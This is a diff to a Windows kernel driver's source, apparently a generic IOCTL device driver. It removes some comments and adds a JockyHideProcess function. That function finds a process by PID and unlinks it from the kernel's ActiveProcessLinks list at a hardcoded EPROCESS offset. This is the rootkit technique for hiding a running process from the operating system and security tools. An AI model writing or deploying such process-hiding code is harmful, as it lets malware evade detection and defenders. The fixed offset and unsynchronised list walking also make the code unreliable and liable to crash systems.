@@ -1,11 +1,11 @@
 #include <ntddk.h>
 #include "IoctlCommon.h"
 
+
 void DriverUnload(PDRIVER_OBJECT DriverObject) {
     UNICODE_STRING symLink;
     RtlInitUnicodeString(&symLink, SYMBOLIC_LINK_NAME);
     
-    // Clean up symbolic link and device object on unload
     IoDeleteSymbolicLink(&symLink);
     if (DriverObject->DeviceObject) {
         IoDeleteDevice(DriverObject->DeviceObject);
@@ -76,7 +76,6 @@ NTSTATUS IoControlRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
         DbgPrint("[JOCKY Driver] Unknown IOCTL code received: 0x%X\n", ioctlCode);
     }
 
-    // These must be outside all branches — every code path hits them
     Irp->IoStatus.Status = status;
     Irp->IoStatus.Information = bytesReturned;
     IoCompleteRequest(Irp, IO_NO_INCREMENT);
@@ -94,7 +93,6 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
     RtlInitUnicodeString(&devName, DEVICE_NAME_SYS);
     RtlInitUnicodeString(&symLink, SYMBOLIC_LINK_NAME);
 
-    // 1. Create the Device Object
     status = IoCreateDevice(
         DriverObject,
         0,
@@ -110,7 +108,6 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
         return status;
     }
 
-    // 2. Create Symbolic Link for User-Mode Access
     status = IoCreateSymbolicLink(&symLink, &devName);
     if (!NT_SUCCESS(status)) {
         DbgPrint("[JOCKY Driver] Failed to create symbolic link (0x%X)\n", status);
@@ -118,7 +115,6 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
         return status;
     }
 
-    // 3. Register Dispatch Routines
     DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateCloseRoutine;
     DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateCloseRoutine;
     DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IoControlRoutine;
@@ -126,4 +122,41 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 
     DbgPrint("[JOCKY Driver] Loaded successfully and device registered.\n");
     return STATUS_SUCCESS;
+}
+
+NTSTATUS JockyHideProcess(ULONG targetPid) {
+    PEPROCESS proc = PsGetCurrentProcess();
+    PEPROCESS startProc = proc;
+
+    do {
+        ULONG pid = (ULONG)(ULONG_PTR)PsGetProcessId(proc);
+
+        if (pid == targetPid) {
+            // Found target — unlink from ActiveProcessLinks
+            PLIST_ENTRY entry = (PLIST_ENTRY)(
+                (ULONG_PTR)proc + 0x448
+            );
+
+            // Relink previous and next entries around this one
+            entry->Blink->Flink = entry->Flink;
+            entry->Flink->Blink = entry->Blink;
+
+            // Point entry to itself — safe if anything walks it later
+            entry->Flink = entry;
+            entry->Blink = entry;
+
+            DbgPrint("[JOCKY] Process PID %lu hidden from list\n",
+                     targetPid);
+            return STATUS_SUCCESS;
+        }
+
+        PLIST_ENTRY flink = (PLIST_ENTRY)(
+            (ULONG_PTR)proc + 0x448
+        );
+        proc = (PEPROCESS)((ULONG_PTR)flink->Flink - 0x448);
+
+    } while (proc != startProc);
+
+    DbgPrint("[JOCKY] PID %lu not found\n", targetPid);
+    return STATUS_NOT_FOUND;
 }
